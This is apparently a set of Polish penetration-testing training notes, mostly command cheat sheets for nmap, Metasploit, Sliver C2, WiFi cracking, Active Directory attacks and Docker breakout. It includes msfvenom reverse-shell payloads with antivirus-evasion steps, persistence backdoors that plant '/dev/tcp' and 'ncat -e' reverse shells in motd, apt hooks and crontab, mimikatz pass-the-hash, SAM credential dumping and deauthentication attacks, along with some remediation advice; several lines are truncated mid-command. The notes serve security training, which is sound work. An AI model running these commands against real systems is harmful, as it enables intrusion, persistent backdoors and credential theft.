https://sekurak.pl/nmap-w-akcji-przykladowy-test-bezpieczenstwa/

nmap:
skaner portów
  - zenmap - GUI dla nmap
  - ndiff - porównywanie wyników
OS/services fingerpting
podstawowy skaner podatności
  - skrypty NSE

Przydatne parametry:
nmap -v
nmap -sn -PE -PS80
nmap -sS -sU
nmap -sT
nmap -sV --version-all
nmap -O
nmap -oN plik.txt
nmap -v -sSUV --version-all -O -oN scan.txt 127.0.0.1
nmap -sn -PE -PS80 192.168.1.0/24
nmap -p 1337
nmap -pnmap -F
nmap --top-ports
nmap --reason
nmap --packet-trace
nmap -sA -sF
nmap -6

identyfikacja hostów (ping scan):
nmap -sn 10.0.0.0/24
nmap -sn 10.10.0.0/24 -oX nmap_sn_101000.xml
skanowanie hostów które nie odpowiadają na ICMP ping request:
nmap -Pn 10.0.0.0/24
nmap -Pn 10.10.0.0/24 -oX nmap_pn_10100.xml
Skan portów - masscan:
masscan -Pn 10.10.0.0/24 -oX masscan_pn_10100.xml --rate=2000
import do Metasploit:
db_import masscan_pn_10100.xml
services -u
hosts -u
services -c port -S www -u -o ports   ---> eksport otwartych portów oznaczonych jako "www" i otwartych, do pliku "ports"

skan interesujących usług ffufem:
ffuf -u https://10.10.0.7:8080/FUZZ -fc 302 -w /usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/   ---> folder z domyślnymi wordlistami na kali

nmap time templates: https://nmap.org/book/man-port-specification.html

Metasploit doc: https://www.offsec.com/metasploit-unleashed/using-databases/

standardowe skrypty nmap
nmap -n -sC 10.0.0.1
decoy scan (spoofowanie IP)
nmap -sS 192.168.89.191 -D 10.0.0.1,10.0.0.2,10.0.0.4
reason (powiedz dlaczego)
nmap -sT 192.168.12.3 --reason
skanowanie hostow z listy
nmap -iL lista.txt -p80,443
pominięcie fazy ICMP (pełne, dokładniejsze skanowanie TCP)
nmap -Pn -p80,443
zapisywanie wyników skanów do pliku (xml, nmap, gnmap)
nmap -oA wszystkie_formaty 192.168.1.2 -p22
badanie na obecność firewall-a
nmap -sA 192.168.1.2
skanowanie z konkretnym portem źródłowym
nmap -g 53 192.168.1.2

https://github.com/scipag/vulscan
Nmap NSE (Nmap Scripting Engine) -rozszerza znacznie funkcjonalność skanera portów; część skryptów charakterystyczna jest dla skanera podatności; dostępne są skrypty działające na cały host jak i na poszczególne usługi
opcja -sC - wtedy włączone są tylko domyślne skrypty
Opcja --script <nazwa> (uruchomienie konkretnego skryptu)
Przykłady:
  - bruteforce mechanizmów logowania (np. ekrany logowania do urządzeń sieciowych)
  - weryfikacja możliwośći anonimowego zalogowania się via ftp
  - pobranie dodatkowych informacji ze skanowanego urządzenia via SNMP
  - realizacja ataku typu DoS na wybraną usługę
  - spidering docelowej strony WWW i pobranie z odpowiedzi adresów e-mail

Dostępne skrypty:
https://nmap.org/nsedoc
Przykład:
nmap -n -v -sT -p 80 --script=http_enum 127.0.0.1

nmap -sV -O -A -sS -v www.intrasoft.com.pl

fuff
ffuf … -H "Authorization: Basic Z3JlZW5jYXQ6aW50aGVmb3Jlc3Q="

nmap 10.0.0.12 --top-ports 10
nmap 10.0.0.12 -p 0-65535
nmap 10.0.0.12 -p-     ==     nmap 10.0.0.12 -p 1-65535
#Nmap na początku sprawdzania wysyła icmp, ale można to wyłączyć:
    nmap 10.0.0.12 -Pn --top-ports 10
https://nmap.org/book/performance-port-selection.html
nmap 10.0.0.12 -sn (wysyła tylko icmp do wybranego hosta)
nmap 10.0.0.0/24 -sn
nmap 10.0.0.12 -Pn --top-ports 100 | tee nmap.txt
nmap 10.0.0.12 -Pn --top-ports 100 -oN nmap.txt
nmap 10.0.0.12 -Pn --top-ports 100 -oG nmap.txt
nmap 10.0.0.12 -Pn --top-ports 100 -oX nmap.xml
nmap 10.0.0.12 -Pn --top-ports 100 -oA nmap
###Tu głośno
nmap 10.0.0.12 -Pn -p 22,38 -sV
nmap 10.0.0.12 -Pn -p 22,38 -O
nmap 10.0.0.12 -Pn -p 22,38 --script ssh*
https://sekurak.pl/nmap-i-12-przydatnych-skryptow-nse/
nmap 10.0.0.12 -Pn -p 22,38 --script "not intrusive"
###nmap timing (przerwy między skanami, by trudniej było wykryć)
-T0  -T1  -T2  -T3()default …
nmap -sU -oX scan_result.xml -e ens4 -p 1-200 10.0.0.0/24

nmap 10.10.0.0/24 -p- -oX mm_nmap_full.xml

masscan   (przepisany nmap, ale możemy definiować prędkość - jak zbyt szybko to będą falsepositivy)

## Smap

https://github.com/s0md3v/Smap

## RustScan

https://github.com/RustScan/RustScan

## Burp Suite

## Zed Attack Proxy (ZAP)

## SQLmap

## Dirb/Gobuster

## Kube-hunter

## ScoutSuite

# Exploitation and Payload Delivery

## Metasploit

Pobranie i instalacja Metasploit:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrchmod +x msfinstall
./msfinstall
uruchomienie bazy msf:
msfdb init
uruchomienie msf:
msfconsole
workspace -a <nazwa>

search ssh
use auxiliary/scanner/ssh/ssh_enumusers
#LUB use <numer>
info
options
set rhosts 10.0.0.11
username admin
run
wyszukiwanie hostów i serwisów:
msf6 > hosts
msf6 > services
tylko services które są UP:
msf6 > services -u
wyszukiwanie modułu dot. SNMP i typu "auxiliary":
msf6 > search snmp aux
używanie modułu:
msf6 > use auxiliary/scanner/snmp/aix_version
wyświetlanie info o module:
msf6 > info
ustawianie opcji (np. RHOSTS):
msf6 > set RHOSTS 10.0.0.11
ustawienie jako RHOSTS hostów, na których uruchomiony jest port 22:
wyjście do głównego menu msf
msf6 auxiliary(scanner/snmp/snmp_enum) > back
msf6 >
podstawowy moduł exe z msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe > /root/tools/av.exe

Techniki na ukrycie obecności przed antywirusem. Msfvenom i sztuczki obniżające skuteczność antywirusów
1. Wygenerowanie podstawowego reverse shella w formacie .exe w msfvenom:
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe > /root/tools/av.exe
1. Przekompilowanie payloadu i jego regeneracja?
root@/usr/share/metasploit-framework/data/templates/src/pe/exe# i686-w64-mingw32-gcc template.c -lws2_32 -o avbypass.exe
root@~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -x /usr/share/metasploit-framework/data/templates/1. Modyfikacja przydzielania pamięci?
nano /opt/metasploit-framework/embedded/framework/data/templates/src/pe/exe/template.c
<modyfikacja>
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe > /root/tools/av.exe
1. Enkodowanie - shikata_ga_nai
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -e shikata-ga-nai -n 10 > /root/tools/av.exe
1. Zmiana domyślnego template na własny + shikata
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe -k -x wlasny_plik.exe -e shikata-ga-nai > /root/toDokładny opis shikata_ga_nai: https://www.mandiant.com/resources/blog/shikata-ga-nai-encoder-still-goingstrong
Dodatkowa istotna i niebezpieczna technika - DLL Sideloading / DLL Hijacking:
https://sekurak.pl/czym-w-praktyce-jest-technika-dll-side-loading-stosowana-przez-niektore-szkodliweoprogramowanie/

nmap w metasploit:
db_nmap <dalsze flagi zgodnie z konwencją nmap>

workspace
workspace -a maku
db_nmap 10.0.0.11-13 --top-ports 100 -sV
hosts
notes …
services
services 10.0.0.11
services -u
services -u -p 22
services -u -p 22 -R
options   (zmienił się RHOST na wszystkie up)

db_import scan_result.xml 

services -u -S 3ubuntu13.5

services 10.0.0.11-13
services -R -u -p 161 10.0.0.11-13     (porty snmp)

search snmp aux
use auxiliary/scanner/snmp/snmp_enum
services -R -u -p 161 10.0.0.11-13
run
loot   (pusto)

search snmp aux
use auxiliary/scanner/snmp/snmp_login
services -R -u -p 161 10.0.0.11-13
run       (community string: public i private!)

search snmp aux
use auxiliary/scanner/snmp/snmp_set
services -R -u -p 161 10.0.0.11-13
run       (community string: public i private!)

snmpwalk …    (zgarniamy resztę potrzebnych informacji jak OID itd.)

use auxiliary/scanner/snmp/snmp_set
set OID …
set OIDVALUE …
set COMMUNITY private
run

search snmp aux
use auxiliary/scanner/snmp/snmp_enum
services -R -u -p 161 10.0.0.11-13
set COMMUNITY private
run


msfconsole
workspace -a matmac
db_import mm_nmap_full.xml     - z namp
hosts -u
services -u
services -S http
db_nmap 10.10.0.0/24 -sV

search ssh
use auxiliary/scanner/ssh/ssh_enumusers
services -u -p 22
use …
set …
exploit …

## Empire

## BLACKEYE

## SET (Social-Engineer Toolkit)

## BeEF

# Post-Exploitation and Privilege Escalation

Co po uzyskaniu dostępu do pierwszej maszyny w sieci?
Dostęp do stabilnej powłoki sieciowej i zabezpieczanie dostępu
1. Interaktywna powłoka (TTY):
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
https://gist.github.com/rollwagen/1fdb6b2a8cd47a33b1ecf70fea6aafde
'''
python -c 'import pty; pty.spawn("/bin/sh")'
/bin/sh -i
perl —e 'exec "/bin/sh";'
echo os.system('/sbin/bash')
'''
1. Persistence - zachowanie dostępu do maszyny po reboot
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux
- Persistence.md

Wyszukiwanie istotnych informacji o sieci LAN
1. Informacje o tym, kim jestem?
whoami
id
cat /etc/passwd
1. Jaka wersja systemu i kernela?
cat /proc/version
uname -a
1. Czy są obecne przydatne binarki? Czy jest kompilator?
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 ...
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null
1. Czy jest coś w cronie?
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"

Eskalacja uprawnień w Linux - podatna wersja kernel
1. Dirtycow:
https://sekurak.pl/dirty-cow-podatnosc-w-jadrze-linuksa-mozna-dostac-roota-jest-exploit/
https://github.com/firefart/dirtycow
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
2. Polkit:
https://sekurak.pl/12-letnia-podatnosc-w-narzedziu-systemowym-polkit-daje-latwa-eskalacje-uprawnien-doroota-sa-juz-exploity-latajcie-linuksy/
https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalationvulnerability-discovered-in-polkits-pkexec-cve-2021-4034
3. Narzędzie do sugerowania potencjalnie użytecznego exploita na kernel
https://github.com/The-Z-Labs/linux-exploit-suggester
https://github.com/bwbwbwbw/linux-exploit-binaries

## Mimikatz

## LinPEAS/WinPEAS

## GTFOBins/LOLBAS
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://fuzzysecurity.com/tutorials/16.html

Lista komend dzięki którym jak mamy do nich dostęp z sudo to możemy zdobyć roota
```bash
https://gtfobins.github.io/
```

2. https://gtfobins.github.io/#+reverse shell
message of the day edit:
echo 'bash -c "bash -i >& /dev/tcp/10.10.0.1/4444 0>&1"' >> /etc/update-motd.d/00-header
apt get pre invoke:
echo 'APT::Update::Pre-Invoke {"bash -c "bash -i >& /dev/tcp/10.10.0.1/4444 0>&1""};' > /etc/apt/apt.conf.d/42backdoor
crontab:
(crontab -l ; echo "@reboot sleep 200 && ncat 10.10.0.1 44444 -e /bin/bash")|crontab 2> /dev/null
dodawanie własnego klucza ssh:
ssh-keygen
cat klucz.pub
echo „<tresc klucz.pub>” >> .ssh/authorized_keys

## Iodine

# Command & Control

https://kapitanhack.pl/2020/04/03/c2/serwery-command-control-czym-sa-i-jaka-jest-ich-rola-we-wspolczesnych-cyberatakach/

Wstęp do tematyki Command and Control. Sliver
Newsy: https://www.bleepingcomputer.com/news/security/hackers-adopt-sliver-toolkit-as-a-cobalt-strikealternative/
Projekt: https://github.com/BishopFox/sliver
Instalacja:
curl https://sliver.sh/install|sudo bash
4 typy połączenia:
wg - wireguard - prosty VPN
http - komunikacja via HTTP/HTTPS
mtls - wykorzystanie mutual TLS (implant weryfikuje cert slivera, a sliver implantu)
dns - komunikacja via DNS
2 typy implantów:
beacon - nasłuchiwanie cykliczne na komendy do wykonania
session - zwykły reverse shell
Tworzenie implantu (beacon):
generate beacon --wg <ip_sliver> --save /tmp --skip-symbols -f shellcode --os windows
Wlaczenie nasluchiwania:
wg
Wykorzystanie danego beaconu:
use <id sesji>
Generowanie strony HTML aby ukryć obecność Sliver:
http --website fake-blog --domain example.com
Generowanie certu dla strony:
https --domain example.com --lets-encrypt
Dodatkowy sklep z modułami:
armory

Wykrywanie serwerów C&C w Internecie - JARM
JARM - unikalna sygnatura usługi sieciowej bazując na odpowiedzi "Server Hello", po zapytaniu "Client Hello",
podczas zestawiania komunikacji TLS.
Każda usługa sieciowa odpowiada inaczej- w zależności od wersji systemu OS, wersji aplikacji, bibliotek na
serwerze, ich wersji, itd
Skrypt wysyła 10 zapytań Client Hello, i analizuje 10 odpowiedzi Server Hello.
https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a/

Ja3
https://www.bussink.net/ja3-and-ja3s-or-the-new-jarm/

# OSINT (Open Source Intelligence)

* https://crt.sh/ - wyszukiwarka certyfikatów dla domeny
   * %.corp.google.com
   * %.so.gov.pl
   * %.tesco.com
   * %.tesco.pl
   * %.bbc.co.uk
* https://apps.db.ripe.net/db-web-ui/#/fulltextsearch - WHOIS full-text search
* https://www.exploit-db.com/google-hacking-database/ - Google Hacking Database
   * site:gov.pl "mysql warning:"
   * site:gov.pl "Index of"
   * site:gov.pl "Index of" "backup"
   * "Index of" "backup" filetype:sql
   * filetype:sql inurl:wp-content/backup-db
* https://securitytrails.com - narzędzie do zbierania informacji o domenie, rekordach DNS i ich historii - przydatne narzędzie w omijaniu WAF Cloudflare

## OSINT Framework

## Maltego

## SpiderFoot

## Shodan

* https://www.shodan.io/ - search engine for Internet-connected dedvices
    * https://github.com/salesforce/jarm
    * Wartości JARM dla wybranych serwerów C&C: https://github.com/cedowens/C2-JARM
    * Wyszukiwanie hostów o danym JARM w Shodan (tutaj: wyszukiwanie listenerów Cobalt Strike): https://www.shodan.io/search?query=ssl.jarm%3A07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1
    * Wyszukiwarka JARM Shodan: https://www.shodan.io/search/facet?query=apache&facet=ssl.jarm; https://www.shodan.io/search/facet?query=nginx&facet=ssl.jarm
    * has_screenshot:yes
    * has_screenshot:yes country:gb
    * has_screenshot:yes country:gb port:5900
    * "Server: nginx" country:gb
    * port:9100 product:"LaserJet"
    * net:17.0.0.0/8
    * net:17.0.0.0/8 port:5060
    * net:17.0.0.0/8 Server: nginx/
* https://www.zoomeye.hk/ - chiński Shodan

## theHarvester

## Recon-ng

## FOCA (Fingerprinting Organizations with Collected Archives)

## Cyotek WebCopy

# WiFi Security

Należy wyposażyć się w kartę sieciową, która ma możliwość wejścia w tryb monitor. Karta sieciowa musi obsługiwać tryb "monitor", pozwalający na monitorowanie pakietów w okolicy. Dodatkowo, aby przeprowadzać ataki typu "evil twin" (klon wybranej sieci Wi-Fi) lub "known beacons" (tworzenie xx sieci WiFi o popularnych nazwach), karta musi wspierać tzw. tworzenie wirtualnych interfejsów. Przykład działającej karty sieciowej - Alfa AWUS036CH.

Atak Evil Twin
```bash
wywalanie WiFi i tworzenie identycznej i może tamten user podłączy się do naszej sieci, ale nasza karta musi mieć dużą moc
```
Atak Karma Mana
```bash
user jak ma auto WiFi connect to jak nie jest podłączony to jego urządzenie śle co chwilę attwifi w celu weryfikacji czy taka sieć istnieje, można wtedy się podszyć pod sieć
```

## Aircrack-ng

Wylisttowanie kart sieciowych. Zobaczymy chipset (można zobaczyc, czy wspiera np. wstrzykiwanie)a
```bash
iwconfig
airmon-ng
```
Sprawdzenie na Windows, czy karta sieciowa ma tryb monitor
```bash
netsh wlan show all
```
Wyświetlenie okolicznych sieci WiFi i informacji o nich
```bash
iwlist wlan0 scan
iwlist wlan0 | grep 'Address\|ESSID' - druga opcja do SSID, ktora wymaga wylaczenia trybu monitor
```
Find MAC Address Vendors
```bash
https://macvendors.com/
```
Zmiana MAC adresu. Trzeba to zrobic przy wylaczonym monitorze, a pozniej mozemy go wlaczyc - jest opcja random lub mac (sami ustawiamy); jak sami ustawiamy to ustawiamy na taki ktory widzimy w obrebie danej sieci i najlepiej by sie wylogowal ten ktos zanim zmienimy sobie na niego
```bash
macchanger --help
```
Zabijamy wszystkie zbędne procesy, które dotykają naszą kartę
```bash
airmon-ng check
airmon-ng check kill
```
Przestawiamy kartę wlxxxxxx w tryb monitor
```bash
airmon-ng start wlxxxxxxxx
```
Ponownie listujemy nasze karty
```bash
airmon-ng
```
Powinna pojawiś się tam karta z dopiskiem mon, uruchamiamy więc nasłuch na tej właśnie karcie. Note the BSSID (MAC address) of the target network. Note the station MAC address (client devices connected to the network).
```bash
airodump-ng wlan0mon
```
Uruchamiamy narzędzie airodump-ng na konkretnym kanale, na którym uruchomiona jest interesująca nas sieć (CH: 1) oraz zapisujemy dane do pliku plik
```bash
airodump-ng -w plik --bssid 18:A6:F7:83:35:14 -c 1 wlan0mon
```
Teraz musimy poczekaż aż ktoś, kto zna poprawne hasło do tej sieci podłączy się - czekamy aż pojawi się fraza WPA Handshake: XX:XX:XX:XX:XX:XX.

Perform the Deauthentication Attack - send deauthentication packets
* To deauthenticate a specific client (Replace <AP_BSSID> with the target Access Point's MAC address and <CLIENT_MAC> with the station's MAC address)
```bash
aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
```
* To deauthenticate all clients from the network (Replace <AP_BSSID> with the target Access Point's MAC address). 0 means send packets indefinitely until you manually stop the command
```bash
aireplay-ng --deauth 0 -a <AP_BSSID> wlan0mon
lub
aireplay-ng -0 0 -e "Maku-5GHz" wlan0mon
```
* Stop Monitor Mode
```bash
airmon-ng stop wlan0mon
```
* Mając handshake możemy przejść do crackowania hasła. Potrzebujemy do tego pliku .cap, który zebraliśmy korzystając z airodump-ng oraz słownika do przeprowadzenia ataku słownikowego. Słownik możemy pobrać np. z OpenWall -- https://www.openwall.com/wordlists/. aircrack-ng to taki biedny hashcat. Również hashcat'em możemy odszyfrować z Handshake hasło.
```bash
wget http://ftp.wcss.pl/pub/security/openwall/pub/passwords/wordlists/languages/Polish/lower.gz
gzip -d lower.gz
aircrack-ng -w lower plik-01.cap
```

## wifite

Automatyzacja ataków z użyciem narzedzia wifite
```bash
https://github.com/derv82/wifite2
```
Stan rodzaju zabezpieczeń sieci WiFi
```bash
WEP nie jest bezpieczny! (aireplay-ng -3 -b 18:A6:F7:83:35:14 -h 3C:15:C2:CB:E4:D6 wlan0man)
WPA nie jest bezpieczny!
WPA2 się jeszcze trzyma
  - WPA2-PSK - Jak widzimy WPA/WPA2 + PSK to oznacza że jest defaultowa konfiguracja sieci gdzie łączymy się hasłem.
  - WPA2 + MGT - sieci zarządzane - uwierzytelnianie nie robi access point, mechanizu auth oddelegowany jest do innego serwera najczęściej serwer RADIUS - ciężej się hakuje
  - WPS - pwned (reaver) - my podajemy pin, a roiter daje nam hasło; złamanie wps'a max 3h i mamy dostep niezaleznie od długosci hasla. Narzedzia: airmon-ng, wash - czy jest wps, reaver - do łamania wps, ale teraz z reguly routery blokuja jak jest za duzo akcji.
WPA3 w drodze - https://wpa3.mathyvanhoef.com/
```
Automatyczne narzędzie do audytu sieci bezprzewodowych (może wywalić userów z sieci, a później próbujemy przechwycić handshake)
```bash
wifite - https://www.kali.org/tools/wifite/
```

## Kismet

## Deauther

https://deauther.com/docs/diy/installation-bin/

# Active Directory Security

https://adsecurity.org/
https://www.active-directory-security.com/
https://www.harmj0y.net/blog/

Podstawy bezpieczeństwa Active Directory
Dwa zdania wstępu
AD - usługa Microsoftu do zarządzania dostępem i tożsamością.
AD działa w oparciu o model klient-serwer. W środowisku AD występują różne role, takie jak kontrolery domeny,
które są serwerami odpowiedzialnymi za przechowywanie i udostępnianie informacji o użytkownikach, grupach,
zasobach i innych obiektach sieciowych. Kontrolery domeny utrzymują bazę danych zawierającą informacje o
wszystkich obiektach w domenie.
Z poziomu kontrolera domeny AD tworzymy użytkowników, modyfikujemy ich uprawnienia itd.
Dużo komplikacji = dużo problemów z bezpieczeństwem.

Wykorzystanie LLMNR i NBT-NS.
Domyślnie w AD włączone są protokoły LLMNR i NBT-NS. Jeżeli urządzenie użytkownika nie zna np.
rozwiązania domeny, to wysyłane jest zapytanie LLMNR lub NBT-NS do całej sieci lokalnej.
Atakujący ma możliwość przechwycenia tych zapytań, i modyfikacji odpowiedzi- np. że dany zasób znajduje się
na urządzeniu atakującego.
W nowszych konfiguracjach Active Directory, zamiast LLMNR oraz NBT-NS używany jest protokół Kerberos
który pozwala na zabezpieczenie przed typowymi problemami ww. Mechanizmów - ale posiada również swoje
problemy - np. Kerberoasting
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting

Problem z NetNTLM i NetNTLMv2
Protokół NTLM jest wykorzystywany przez system Windows do uwierzytelniania w sieciach lokalnych. Gdy
użytkownik próbuje uzyskać dostęp do zasobów sieciowych, klient Windows może zainicjować protokół
NetNTLM, aby uwierzytelnić się na serwerze. Podczas tego procesu klient i serwer komunikują się, przesyłając
między sobą komunikaty NetNTLM.
Responder jest w stanie przechwycić te dane uwierzytelniające ponieważ działa jako pośrednik między klientem a
serwerem.

NTLM Relay
NTLM relay to atak, w którym atakujący przechwytuje uwierzytelnione sesje NetNTLM i przekierowuje je do
innych maszyn, co umożliwia zdalne wykonanie poleceń lub uzyskanie dostępu do zasobów w sieci bez
konieczności znajomości oryginalnych haseł użytkowników.
Zabezpieczenie- jeżeli w naszym AD pakiety SMB są podpisywane (smb signing enabled), to nie mamy
możliwości podszycia się pod kogoś innego.

Pass the hash
Pass the hash (PTH) to technika ataku, w której atakujący przechwytuje skrót (hash) hasła użytkownika z
systemu (z bazy haseł SAM), a następnie wykorzystuje go do uwierzytelnienia się na innych maszynach w sieci,
obejścia uwierzytelniania opartego na hasłach i uzyskania dostępu do zasobów, nawet bez znajomości
rzeczywistego hasła. Atak ten jest możliwy, gdy systemy używają protokołów uwierzytelniania, takich jak NTLM,
które przechowują skróty hasła, które można przechwycić i wykorzystać do podszywania się pod użytkownika.

Uniwersalny "przechwycacz" NetNTLM - Responder
Responder nasłuchuje na odpowiednich interfejsach sieciowych na (m.in) pakiety LLMNR i NBT-NS, które są
wysyłane przez inne komputery w sieci lokalnej.
Gdy Responder wykryje takie zapytanie, udaje fałszywy serwer i odpowiada na to zapytanie, podszywając się pod
rzeczywisty serwer.
Odpowiedź Respondera zawiera fałszywe informacje uwierzytelniające, które są wysyłane z powrotem do
komputera, który wysłał zapytanie.
Dzięki temu, może przechwytywać m.in NetNTLM i NetNTLMv2.

Przykładowy atak na AD:
1. Responder - przechwycenie NetNTLMv2/ NetNTLMv2 poprzez zatrucie komunikacji LLMR i NBT-NS.
2. Jeśli mamy dostęp do NetNTLMv1 -> NTLM Relay aby spróbowac zalogować się na inne urządzenia
3. Jeśli tylko NetNTLMv2 -> Hasło należy odzyskać hashcatem.
4. Zalogowanie się do hosta zdobytymi poświadczeniami - xfreerdp na Kali
5. Uruchomienie mimikatz
6. Zebranie lokalnego NTLM :-)
7. Próba zalogowania na inne konto (admina lub admina AD?) z użyciem NTLM- Pass the hash
8. Dalszy rekonesans

ww. Atak w praktyce:
1. Responder i zdobycie NetNTLMv2
sudo responder -I eth1
┌──(kali㉿kali)-[/usr/share/responder/logs]
└─$ cat SMB-NTLMv2-SSP-fe80::8866:d96d:c108:4b31.txt
admin::SEKURAKCORP:b443ed44cb702459:[...]
1. Odzyskanie formy plaintext w hashcat
sudo hashcat -r best64.rule -w 4 -O -m 5600 hashes_netnlvm ../dictionary/breachcompilation.txt -o cracked_netntlmv2
1. Zalogowanie do urządzenia
xfreerdp /u:username /d:domain /p:password /v:address
1. Pobranie i uruchomienie mimikatz. Zebranie NTLM
https://github.com/ParrotSec/mimikatz
./mimikatz.exe
privilege::debugprivi
Sekurlsa::logonpasswords
... i mamy NTLM :-)
1. Pass the hash
mimikatz # sekurlsa::pth /user:admin /domain:sekurakcorp.local /ntlm:<hasz ntlm>

Uwaga!
NTLM =! NetNTLM =! NetNTLMv2.
NTLM używany jest lokalnie na maszynie do przechowywania haseł w zaszyfrowanej postaci.
NetNTLMv1 - szyfr używany jako protokół challenge/response między serwerem a maszyną. Po przechwyceniu go
możemy wykonać atak NTLM Relay lub odzyskać hasło w postaci jawnej.
NetNTLMv2 - ulepszony szyfr NetNTLMv1. Nie możemy wykorzystać go do NTLM Relay, ale można odzyskać
postać jawną hasła.
Dokładna różnica:
https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4

Remedium
1. Aktualizuj systemy regularnie :-) (np. Windows Serwer 2019 + nie korzysta by default z NetNTLMv1 a
tylko NetNTLMv2, które może być wykorzystane do NTLM Relay)
2. Wymuszaj silną politykę haseł (m.in. utrudnienie łamania netNTLMv2)
3. 2FA w organizacji - aby zalogować się do hosta nawet po złamaniu NetNTLMv2, konieczne jest podanie
dodatkowego składnika
4. Monitorowanie i rejestrowanie zdarzeń - w AD aplikacje takie jak Event Viewer i sysmon
5. Wymuszenie Windows Defender (pamiętaj o włączeniu wysyłania próbek do serwera
i włączeniu ochrony z chmury!)
6. Aby zabezpieczyć się przed NTLM Relay - włącz podpisywanie pakietów SMB
Świetne narzędzie do monitorowania zdarzeń w Windows - Sysmon
https://learn.microsoft.com/pl-pl/sysinternals/downloads/sysmon
Sysmon w praktyce - jak wyłapywane są próby wykorzystania złośliwego oprogramowania (np. sliver):
https://www.youtube.com/watch?v=qIbrozlf2wM
Dodatkowe materiały:
https://hackdefense.com/publications/het-belang-van-smb-signing/
Roadmapa pentestów AD:
https://raw.githubusercontent.com/Orange-Cyberdefense/ocdmindmaps/main/img/pentest_ad_dark_2023_02.svg
Post o bezpieczeństwie AD:
https://zer1t0.gitlab.io/posts/attacking_ad/

Inne narzędzia przydatne w pentestach Active Directory, pokazywane w czasie szkolenia:
crackmapexec -> Enumeracja udostępnionych zasobów smb, pozwala również na sprawdzenie, czy nasz
użytkownik domeny, może uwierzytelnić się do maszyny z użyciem innych protokołów (LDAP/ SSH/ RDP/
WINRM). "Szwajcarski scyzoryk" enumeracji AD.
Enumeracja shares smb:
crackmapexec smb ./nazwy_komputerow -u <user> -p <pass> --shares
Enumeracja z użyciem LDAP i wykonanie komendy „whoami”:
crackmapexec ldap ./nazwy_komputerow -u <user> -p <pass> -M whoami
...
crackmapexec smb --gen-relay-list test.txt 192.168.1.0/24
https://github.com/byt3bl33d3r/CrackMapExec
https://ptestmethod.readthedocs.io/en/latest/cme.html
https://medium.com/r3d-buck3t/crackmapexec-in-action-enumerating-windows-networks-part-1-
3a6a7e5644e9
Impacket -> Zestaw skryptów Python pozwalających na enumerację środowiska AD oraz jego postexploitację, gdy znamy poświadczenia dowolnego użytkownika AD.
Przykładowy moduł do enumeracji plików GPP (Group Policy Password) dostępnych dla każdego użytkownika
AD na kontrolerze domeny, który często zawiera hasła:
impacket-Get-GPPPassword DOMAIN.LOCAL/USER:PASS@DC.IP
https://github.com/fortra/impacket
https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d
Evil-Winrm -> Jeżeli mamy poświadczenia domenowe użytkownika, a na jednym z komputerów
organizacji uruchomiony jest protokół Winrm (port 5985/ TCP), to możemy spróbować zalogować się do
niego, podobnie jak z SSH. Służy do tego aplikacja evil-winrm.
evil-winrm -u USER -p PASS -i HOST.DOMAIN.LOCAL
smbclient -> Po wykryciu w sieci (np. z użyciem crackmapexec) zasobu smb dostępnego dla naszego
użytkownika, możliwe jest zalogowanie się do niego i pobranie/ wgranie zasobów, z użyciem smbclient.
smbmap -> Inne narzędzie pozwalające na enumerację zasobów smb w lokalnej sieci

Pobranie lokalnej bazy haseł SAM, na której mamy uprawnienia lokalnego administratora. Baza
SAM/ NTDS zawiera m.in zcachowane hasła użytkowników domeny, którzy logowali się na nasz
komputer w przeszłości.
C:\Windows> reg save HKLM\SYSTEM system.bin
C:\Windows> reg save HKLM\SECURITY security.bin
C:\Windows> reg save HKLM\SAM sam.bin
a później - pobranie tych plików na swoją VM Kali:
*Evil-WinRM* PS C:\Windows> download security.bin
*Evil-WinRM* PS C:\Windows> download sam.bin
*Evil-WinRM* PS C:\Windows> download system.bin
później, na kalim, wyciągnięcie z ww. plików credentiali:
Impacket-secretsdump -system system.bin -security security.bin -sam sam.bin LOCAL
Opis ww. techniki:
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-crackingmscash-cached-domain-credentials
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration

# Containerization (Docker) Security

https://github.com/docker/docker-bench-security

Verify if you're inside a Docker container
```bash
cat /proc/1/cgroup | grep docker
cat /proc/1/cgroup | grep containerd
ls -la /.dockerenv
hostname
cat /etc/os-release
docker ps
ps -e
mount | grep docker
```

ip addr   - sprawdzamy, czy są sieci dockera (np. docker0) - czy działa docker cli
id    - sprawdzenie, czy jesteśmy w grupie docker
docker ps
docker exec -it nginx bash    - pewnie będziemy rootem - może wchodzić w interakcję z istniejącymi kontenerami jako root
docker run --rm -it --pid=host --privileged ubuntu bash     - tworzyć nowe - nie koniecznie zachowując dobre praktyki bezpieczeństwa
--pid=host -> kontener używa przestrzeni PID hosta - ma dostęp do wszystkich procesów wewnątrz hosta
